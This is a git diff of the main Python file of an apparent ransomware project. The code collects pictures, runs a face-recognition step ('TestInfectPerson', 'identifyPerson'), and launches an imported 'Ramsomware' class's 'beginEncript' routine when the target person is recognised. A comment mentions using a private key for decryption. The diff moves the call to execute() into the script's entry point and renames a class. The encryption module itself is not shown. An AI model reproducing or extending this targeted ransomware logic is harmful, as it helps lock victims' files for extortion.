@@ -10,9 +10,8 @@ import os
 #from NeuralNetwork import *
 
 from obtainPictures import *
-from decideInfect import *
+from testInfectPerson import *
 from file_encryption.ransomware import *
-from file_encryption.rsa_key import *
 class Main(object):
    
     def decriptRansom(self):
@@ -22,27 +21,29 @@ class Main(object):
         
     def __init__(self):
         
-        self.execute()
+        pass
         
-           #USar clve privada para desencriptar el codigo
+           #USar clave privada para desencriptar el codigo
     def execute(self):
         path=os.path.abspath(os.getcwd())
         print(path)
         self.obtain=ObtainPicture()
         self.obtain.obtainPicture()
         os.chdir(path)
-        self.person = IdentifyPerson()
+        print(path)
+        self.person = TestInfectPerson()
         # load train dataset
         
         self.person.saveDataset()
         self.person.embeddingDataset()
         if( self.person.identifyPerson()):
-           pp = Ramsomware()
-           pp.beginEncript()
+            pp = Ramsomware()
+            pp.beginEncript()
+            
 
 
 
 if __name__ == '__main__':
     
     main = Main()
-    main
+    main.execute()
